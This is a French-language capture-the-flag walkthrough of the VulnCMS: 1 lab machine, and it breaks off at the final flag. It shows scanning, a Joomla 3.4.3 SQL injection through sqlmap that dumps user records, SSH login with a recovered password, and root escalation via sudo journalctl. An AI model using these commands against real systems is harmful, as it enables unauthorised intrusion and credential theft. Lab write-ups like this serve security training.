{"hash":"e9e710b63b02d049a9f8a5359c5c22618737fe2f","data":{"post":{"title":"CTF VulnCMS: 1","date":"19 June 2021","content":"<h2>Avant propos</h2>\n<p>Le déroulé de ce hack a été réalisé sur une machine prévue à cette effet. Il est interdit de mener ce genre d'action sur une machine qui ne vous appartient pas sans l'accord de son ou sa propriétaire.<br>\nCe CTF a été réalisé avec une machine attaquante <strong>Kali 2021.2</strong> (<code class=\"language-text\">lsb_release -r</code>).</p>\n<h2>Enumération</h2>\n<p>On récupère l'adresse IP de la machine distante avec <strong>Netdiscover</strong> <code class=\"language-text\">sudo netdiscover</code>.<br>\nAvant de poursuivre, on exporte cette adresse dans une variable pour être tranquille par la suite <code class=\"language-text\">export IP=192.168.1.26</code>.<br>\nPuis on créé un dossier dédié à ce CTF <code class=\"language-text\">cd Documents/ctf &amp;&amp; mkdir VulnCMS1 &amp;&amp; cd VulnCMS1</code>.<br>\nOn lance <strong>Nmap</strong> pour scanner les ports de la machine distante.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nmap -A -p- <span class=\"token variable\">$IP</span> -oN nmap.txt\nPORT     STATE SERVICE VERSION\n<span class=\"token number\">22</span>/tcp   <span class=\"token function\">open</span>  <span class=\"token function\">ssh</span>     OpenSSH <span class=\"token number\">7</span>.6p1 Ubuntu 4ubuntu0.3 <span class=\"token punctuation\">(</span>Ubuntu Linux<span class=\"token punctuation\">;</span> protocol <span class=\"token number\">2.0</span><span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span> ssh-hostkey: \n<span class=\"token operator\">|</span>   <span class=\"token number\">2048</span> 8c:9f:7e:78:82:ef:76:f6:26:23:c9:52:6d:aa:fe:d0 <span class=\"token punctuation\">(</span>RSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>   <span class=\"token number\">256</span> 2a:e2:f6:d2:52:1c:c1:d0:3d:aa:40:e6:b5:08:1d:45 <span class=\"token punctuation\">(</span>ECDSA<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_  <span class=\"token number\">256</span> fa:c9:eb:58:e3:d2:b7:4a:74:77:fc:69:0e:b6:68:08 <span class=\"token punctuation\">(</span>ED25519<span class=\"token punctuation\">)</span>\n<span class=\"token number\">80</span>/tcp   <span class=\"token function\">open</span>  http    nginx <span class=\"token number\">1.14</span>.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-server-header: nginx/1.14.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: W3.CSS Template\n<span class=\"token number\">5000</span>/tcp <span class=\"token function\">open</span>  http    nginx <span class=\"token number\">1.14</span>.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-generator: WordPress <span class=\"token number\">5.7</span>.2\n<span class=\"token operator\">|</span>_http-server-header: nginx/1.14.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: fsociety <span class=\"token operator\">&amp;</span><span class=\"token comment\">#8211; Just another WordPress site</span>\n<span class=\"token number\">8081</span>/tcp <span class=\"token function\">open</span>  http    nginx <span class=\"token number\">1.14</span>.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-generator: Joomla<span class=\"token operator\">!</span> - Open Source Content Management\n<span class=\"token operator\">|</span> http-robots.txt: <span class=\"token number\">15</span> disallowed entries \n<span class=\"token operator\">|</span> /joomla/administrator/ /administrator/ /bin/ /cache/ \n<span class=\"token operator\">|</span> /cli/ /components/ /includes/ /installation/ /language/ \n<span class=\"token operator\">|</span>_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/\n<span class=\"token operator\">|</span>_http-server-header: nginx/1.14.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: Home\n<span class=\"token number\">9001</span>/tcp <span class=\"token function\">open</span>  http    nginx <span class=\"token number\">1.14</span>.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-generator: Drupal <span class=\"token number\">7</span> <span class=\"token punctuation\">(</span>http://drupal.org<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-server-header: nginx/1.14.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n<span class=\"token operator\">|</span>_http-title: fsociety.web</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un serveur <strong>SSH</strong> sur le port <strong>22</strong> puis 4 serveurs <strong>Nginx</strong> 1.14.0 sur 4 ports différents : <strong>80</strong>, <strong>5000</strong> (<strong>Wordpress</strong> 5.7.2), <strong>8001</strong> (<strong>Joomla</strong>) et <strong>9001</strong> (<strong>Drupal</strong> 7).</p>\n<p>On examine le premier site avec <strong>Nikto</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nikto -h http://<span class=\"token variable\">$IP</span> -o nikto_default.txt\n+ Server: nginx/1.14.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class=\"token keyword\">in</span> a different fashion to the MIME <span class=\"token builtin class-name\">type</span>\n+ No CGI Directories found <span class=\"token punctuation\">(</span>use <span class=\"token string\">'-C all'</span> to force check all possible <span class=\"token function\">dirs</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">''</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On vérifie ce que contient le fichier \"robots.txt\".</p>\n<div class=\"gridsome-highlight\" data-language=\"txt\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-txt line-numbers\"><code class=\"language-txt\">User-agent: *\n\nDisallowed:\n/home.html\n/about.html</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Ces 2 pages n'apportent rien de nouveau donc on examine le second site, celui sous <strong>Wordpress</strong> avec <strong>Nikto</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nikto -h http://<span class=\"token variable\">$IP</span>:5000 -o nikto_WP.txt\n+ Server: nginx/1.14.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ Uncommon header <span class=\"token string\">'x-redirect-by'</span> found, with contents: WordPress\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class=\"token keyword\">in</span> a different fashion to the MIME <span class=\"token builtin class-name\">type</span>\n+ Root page / redirects to: http://192.168.1.26:5000/\n+ No CGI Directories found <span class=\"token punctuation\">(</span>use <span class=\"token string\">'-C all'</span> to force check all possible <span class=\"token function\">dirs</span><span class=\"token punctuation\">)</span>\n+ Uncommon header <span class=\"token string\">'link'</span> found, with contents: <span class=\"token operator\">&lt;</span>http://fsociety.web:5000/wp-json/<span class=\"token operator\">></span><span class=\"token punctuation\">;</span> <span class=\"token assign-left variable\">rel</span><span class=\"token operator\">=</span><span class=\"token string\">\"https://api.w.org/\"</span>\n+ /wp-content/plugins/akismet/readme.txt: The WordPress Akismet plugin <span class=\"token string\">'Tested up to'</span> version usually matches the WordPress version\n+ /wp-content/plugins/hello.php: PHP error reveals <span class=\"token function\">file</span> system path.\n+ OSVDB-62684: /wp-content/plugins/hello.php: The WordPress hello.php plugin reveals a <span class=\"token function\">file</span> system path\n+ /wp-links-opml.php: This WordPress script reveals the installed version.\n+ OSVDB-3092: /license.txt: License <span class=\"token function\">file</span> found may identify site software.\n+ Cookie wordpress_test_cookie created without the httponly flag\n+ /wp-login.php: Wordpress login found</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ wpscan --url http://<span class=\"token variable\">$IP</span>:5000 -e u\n<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span> User<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> Identified:\n\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> wordpress_admin</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>En tentant le brute force avec l'utilisateur \"wordpress_admin\" <code class=\"language-text\">wpscan --url http://$IP:5000 -U wordpress_admin -P /usr/share/wordlists/rockyou.txt</code>, ça ne mène à rien...</p>\n<p>On poursuit en examinant le troisième site, avec le second CMS <strong>Joomla</strong> avec <strong>Nikto</strong>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ nikto -h http://<span class=\"token variable\">$IP</span>:8081 -o nikto_Joomla.txt\n+ Server: nginx/1.14.0 <span class=\"token punctuation\">(</span>Ubuntu<span class=\"token punctuation\">)</span>\n+ The anti-clickjacking X-Frame-Options header is not present.\n+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS\n+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site <span class=\"token keyword\">in</span> a different fashion to the MIME <span class=\"token builtin class-name\">type</span>\n+ Entry <span class=\"token string\">'/administrator/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/bin/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/cache/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/cli/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/components/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/includes/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/language/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/layouts/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/libraries/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/logs/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/modules/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/plugins/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ Entry <span class=\"token string\">'/tmp/'</span> <span class=\"token keyword\">in</span> robots.txt returned a non-forbidden or redirect HTTP code <span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n+ <span class=\"token string\">\"robots.txt\"</span> contains <span class=\"token number\">14</span> entries <span class=\"token function\">which</span> should be manually viewed.\n+ OSVDB-8193: /index.php?module<span class=\"token operator\">=</span>ew_filemanager<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">type</span><span class=\"token operator\">=</span>admin<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">func</span><span class=\"token operator\">=</span>manager<span class=\"token operator\">&amp;</span><span class=\"token assign-left variable\">pathext</span><span class=\"token operator\">=</span><span class=\"token punctuation\">..</span>/<span class=\"token punctuation\">..</span>/<span class=\"token punctuation\">..</span>/etc: EW FileManager <span class=\"token keyword\">for</span> PostNuke allows arbitrary <span class=\"token function\">file</span> retrieval.\n+ OSVDB-3092: /administrator/: This might be interesting<span class=\"token punctuation\">..</span>.\n+ OSVDB-3092: /bin/: This might be interesting<span class=\"token punctuation\">..</span>.\n+ OSVDB-3092: /includes/: This might be interesting<span class=\"token punctuation\">..</span>.\n+ OSVDB-3092: /logs/: This might be interesting<span class=\"token punctuation\">..</span>.\n+ OSVDB-3092: /tmp/: This might be interesting<span class=\"token punctuation\">..</span>.\n+ OSVDB-3092: /LICENSE.txt: License <span class=\"token function\">file</span> found may identify site software.\n+ /htaccess.txt: Default Joomla<span class=\"token operator\">!</span> htaccess.txt <span class=\"token function\">file</span> found. This should be removed or renamed.\n+ /administrator/index.php: Admin login page/section found.\n+ <span class=\"token number\">8742</span> requests: <span class=\"token number\">0</span> error<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> and <span class=\"token number\">26</span> item<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span> reported on remote <span class=\"token function\">host</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Pour trouver la version de <strong>Joomla</strong> utilisée, on va se servir de l'outil d'analyse <strong>joomscan</strong>. On le récupère depuis son repo Git <code class=\"language-text\">git clone https://github.com/rezasp/joomscan.git &amp;&amp; cd joomscan</code> afin de lancer le scan.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ perl joomscan.pl -u http://<span class=\"token variable\">$IP</span>:8081\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> Detecting Joomla Version\n<span class=\"token punctuation\">[</span>++<span class=\"token punctuation\">]</span> Joomla <span class=\"token number\">3.4</span>.3\n\n<span class=\"token punctuation\">[</span>+<span class=\"token punctuation\">]</span> Core Joomla Vulnerability\n<span class=\"token punctuation\">[</span>++<span class=\"token punctuation\">]</span> Joomla<span class=\"token operator\">!</span> <span class=\"token number\">3.2</span>.x <span class=\"token operator\">&lt;</span> <span class=\"token number\">3.4</span>.4 - SQL Injection\nEDB <span class=\"token builtin class-name\">:</span> https://www.exploit-db.com/exploits/38534/\n<span class=\"token punctuation\">[</span><span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On trouve la version de <strong>Joomla</strong>: 3.4.3 ainsi que les failles associées. C'est la première qui nous intéresse car c'est une injection SQL. Pour ce faire, on va utiliser l'outil <strong>SQLMap</strong>.<br>\nDans un premier temps, on récupère les bases de données utilisées.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ sqlmap -u <span class=\"token string\">'http://'</span><span class=\"token variable\">$IP</span><span class=\"token string\">':8081/index.php?option=com_contenthistory&amp;view=history&amp;item_id=1&amp;type_id=1&amp;list[select]=*'</span> --tamper<span class=\"token operator\">=</span>apostrophemask --technique<span class=\"token operator\">=</span>E --dbs\navailable databases <span class=\"token punctuation\">[</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span>:\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> information_schema\n<span class=\"token punctuation\">[</span>*<span class=\"token punctuation\">]</span> joomla_db</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>La base de données qui nous intéresse est la seconde \"joomla_db\".<br>\nPuis dans un second temps, on récupère la liste des tables.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ sqlmap -u <span class=\"token string\">'http://'</span><span class=\"token variable\">$IP</span><span class=\"token string\">'8081/index.php?option=com_contenthistory&amp;view=history&amp;item_id=1&amp;type_id=1&amp;list[select]=*'</span> --tamper<span class=\"token operator\">=</span>apostrophemask --technique<span class=\"token operator\">=</span>E -D joomla_db -T <span class=\"token function\">users</span> --tables --dump \n<span class=\"token punctuation\">[</span><span class=\"token punctuation\">..</span>.<span class=\"token punctuation\">]</span>\n+-------------------------------+\n<span class=\"token operator\">|</span> hs23w_usergroups              <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> hs23w_users                   <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> hs23w_viewlevels              <span class=\"token operator\">|</span>\n+-------------------------------+</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a une liste de tables préfixées par \"hs23w_\". Celle qui nous intéresse est la \"hs23w_users\".<br>\nEt ensuite, dans un troisième et dernier temps, on récupère la liste des utilisateurs.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ sqlmap -u <span class=\"token string\">'http://'</span><span class=\"token variable\">$IP</span><span class=\"token string\">':8081/index.php?option=com_contenthistory&amp;view=history&amp;item_id=1&amp;type_id=1&amp;list[select]=*'</span> --tamper<span class=\"token operator\">=</span>apostrophemask --technique<span class=\"token operator\">=</span>E -D joomla_db -T hs23w_users --dump\nDatabase: joomla_db\nTable: hs23w_users\n<span class=\"token punctuation\">[</span><span class=\"token number\">2</span> entries<span class=\"token punctuation\">]</span>\n+----+------------+---------+-------+-------------------------+---------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+\n<span class=\"token operator\">|</span> <span class=\"token function\">id</span> <span class=\"token operator\">|</span> name       <span class=\"token operator\">|</span> otep    <span class=\"token operator\">|</span> block <span class=\"token operator\">|</span> email                   <span class=\"token operator\">|</span> otpKey  <span class=\"token operator\">|</span> params                                                                                       <span class=\"token operator\">|</span> password                                                     <span class=\"token operator\">|</span> username        <span class=\"token operator\">|</span> sendEmail <span class=\"token operator\">|</span> activation <span class=\"token operator\">|</span> resetCount <span class=\"token operator\">|</span> registerDate        <span class=\"token operator\">|</span> requireReset <span class=\"token operator\">|</span> lastResetTime       <span class=\"token operator\">|</span> lastvisitDate       <span class=\"token operator\">|</span>\n+----+------------+---------+-------+-------------------------+---------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+\n<span class=\"token operator\">|</span> <span class=\"token number\">46</span> <span class=\"token operator\">|</span> Super User <span class=\"token operator\">|</span> <span class=\"token operator\">&lt;</span>blank<span class=\"token operator\">></span> <span class=\"token operator\">|</span> <span class=\"token number\">0</span>     <span class=\"token operator\">|</span> Fluntence54@armyspy.com <span class=\"token operator\">|</span> <span class=\"token operator\">&lt;</span>blank<span class=\"token operator\">></span> <span class=\"token operator\">|</span> <span class=\"token operator\">&lt;</span>blank<span class=\"token operator\">></span>                                                                                      <span class=\"token operator\">|</span> <span class=\"token variable\">$2y</span><span class=\"token variable\">$10</span><span class=\"token variable\">$EYc6SKfMLzlLE</span>/IcD9a6XeAe2Uv7WTBFlbbqRrnpht1K0M1bLrWee <span class=\"token operator\">|</span> joomlaCMS_admin <span class=\"token operator\">|</span> <span class=\"token number\">1</span>         <span class=\"token operator\">|</span> <span class=\"token number\">0</span>          <span class=\"token operator\">|</span> <span class=\"token number\">0</span>          <span class=\"token operator\">|</span> <span class=\"token number\">2021</span>-05-29 <span class=\"token number\">10</span>:08:24 <span class=\"token operator\">|</span> <span class=\"token number\">0</span>            <span class=\"token operator\">|</span> 0000-00-00 00:00:00 <span class=\"token operator\">|</span> <span class=\"token number\">2021</span>-05-31 09:14:41 <span class=\"token operator\">|</span>\n<span class=\"token operator\">|</span> <span class=\"token number\">47</span> <span class=\"token operator\">|</span> elliot     <span class=\"token operator\">|</span> <span class=\"token operator\">&lt;</span>blank<span class=\"token operator\">></span> <span class=\"token operator\">|</span> <span class=\"token number\">1</span>     <span class=\"token operator\">|</span> 5T3e<span class=\"token operator\">!</span>_M0un7i@N          <span class=\"token operator\">|</span> <span class=\"token operator\">&lt;</span>blank<span class=\"token operator\">></span> <span class=\"token operator\">|</span> <span class=\"token punctuation\">{</span><span class=\"token string\">\"admin_style\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"\"</span>,<span class=\"token string\">\"admin_language\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"\"</span>,<span class=\"token string\">\"language\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"\"</span>,<span class=\"token string\">\"editor\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"\"</span>,<span class=\"token string\">\"helpsite\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"\"</span>,<span class=\"token string\">\"timezone\"</span><span class=\"token builtin class-name\">:</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">}</span> <span class=\"token operator\">|</span> <span class=\"token variable\">$2y</span><span class=\"token variable\">$10</span><span class=\"token variable\">$jddnEQpjriJX9jPxh6C</span>/hOag4ZZXae4iVhL7GVRPC9SHWgqbi4SYy <span class=\"token operator\">|</span> elliot          <span class=\"token operator\">|</span> <span class=\"token number\">0</span>         <span class=\"token operator\">|</span> <span class=\"token operator\">&lt;</span>blank<span class=\"token operator\">></span>    <span class=\"token operator\">|</span> <span class=\"token number\">0</span>          <span class=\"token operator\">|</span> <span class=\"token number\">2021</span>-05-31 09:16:30 <span class=\"token operator\">|</span> <span class=\"token number\">0</span>            <span class=\"token operator\">|</span> 0000-00-00 00:00:00 <span class=\"token operator\">|</span> 0000-00-00 00:00:00 <span class=\"token operator\">|</span>\n+----+------------+---------+-------+-------------------------+---------+----------------------------------------------------------------------------------------------+--------------------------------------------------------------+-----------------+-----------+------------+------------+---------------------+--------------+---------------------+---------------------+</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On a un utilisateur \"elliot\" avec ce qui semblerait être un mot de passe \"5T3e!_M0un7i@N\" dans le champ \"email\".</p>\n<h2>Pénétration</h2>\n<p>On se connecte au serveur <strong>SSH</strong> avec ce compte.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">ssh</span> elliot@<span class=\"token variable\">$IP</span>\npassword: 5T3e<span class=\"token operator\">!</span>_M0un7i@N</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Et on trouve le premier flag.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> user.txt\n<span class=\"token number\">9046628504775551</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<h2>Escalation</h2>\n<p>Vous remarquez que la commande <code class=\"language-text\">cd</code> n'est pas disponible. Déconnectez-vous de SSH et reconnectez-vous avec la commande suivante <code class=\"language-text\">ssh elliot@$IP -t &quot;bash --noprofile&quot;</code>.</p>\n<p>En farfouillant dans le dossier de l'application <strong>Drupal</strong>, on tombe sur un fichier intéressant...</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> /var/www/html/drupal/misc/tyrell.pass\nUsername: tyrell\nPassword: mR_R0bo7_i5_R3@<span class=\"token operator\">!</span>_</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span></span></pre></div>\n<p>On a trouvé le mot de passe de l'utilisateur \"tyrell\".</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">su</span> tyrell\npassword: mR_R0bo7_i5_R3@<span class=\"token operator\">!</span>_</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span></span></pre></div>\n<p>Cet utilisateur a le privilège root sur la commande <code class=\"language-text\">journalctl</code>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> -l\nMatching Defaults entries <span class=\"token keyword\">for</span> tyrell on vuln_cms:\n    env_reset, mail_badpass, <span class=\"token assign-left variable\">secure_path</span><span class=\"token operator\">=</span>/usr/local/sbin<span class=\"token punctuation\">\\</span>:/usr/local/bin<span class=\"token punctuation\">\\</span>:/usr/sbin<span class=\"token punctuation\">\\</span>:/usr/bin<span class=\"token punctuation\">\\</span>:/sbin<span class=\"token punctuation\">\\</span>:/bin<span class=\"token punctuation\">\\</span>:/snap/bin\n\nUser tyrell may run the following commands on vuln_cms:\n    <span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> NOPASSWD: /bin/journalctl</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>On cherche la commande à exécuter sur <a href=\"https://gtfobins.github.io/gtfobins/journalctl/#sudo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\">GTFOBins</a>.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">sudo</span> journalctl\n$ /bin/sh\n$ <span class=\"token function\">id</span>\n<span class=\"token assign-left variable\">uid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">gid</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span> <span class=\"token assign-left variable\">groups</span><span class=\"token operator\">=</span><span class=\"token number\">0</span><span class=\"token punctuation\">(</span>root<span class=\"token punctuation\">)</span></code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Ainsi, on trouve le second et dernier flag.</p>\n<div class=\"gridsome-highlight\" data-language=\"bash\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-bash line-numbers\"><code class=\"language-bash\">$ <span class=\"token function\">cat</span> 